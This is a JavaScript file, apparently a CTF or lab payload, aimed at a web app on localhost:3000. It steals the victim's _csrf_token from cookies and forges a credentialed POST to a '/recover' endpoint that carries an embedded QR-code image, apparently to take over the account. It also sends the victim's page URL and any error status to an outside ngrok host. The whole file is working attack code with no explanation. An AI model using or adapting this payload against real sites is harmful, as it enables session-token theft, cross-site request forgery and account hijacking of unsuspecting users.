function dataURItoBlob(dataURI) {
    // convert base64/URLEncoded data component to raw binary data held in a string
    var byteString;
    if (dataURI.split(',')[0].indexOf('base64') >= 0)
        byteString = atob(dataURI.split(',')[1]);
    else
        byteString = unescape(dataURI.split(',')[1]);

    // separate out the mime component
    var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];

    // write the bytes of the string to a typed array
    var ia = new Uint8Array(byteString.length);
    for (var i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }

    return new Blob([ia], {type:mimeString});
}

if (window.location.search === "?x") {
    var d=new FormData();
    d.append("qrcode", dataURItoBlob('data:image/png;base64,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'
), "qr.png");
    d.append("_csrf_token", document.cookie.split("_csrf_token=")[1]);
    fetch('http://localhost:3000/recover', {method: 'POST', body: d, credentials: 'same-origin'}).then(x => window.location = 'http://localhost:3000/documents').catch(x => window.location = 'https://e8023e55.ngrok.io/?x=fail-'+x.status);
} else {
    window.location = "https://e8023e55.ngrok.io/?x="+window.location.href;
}
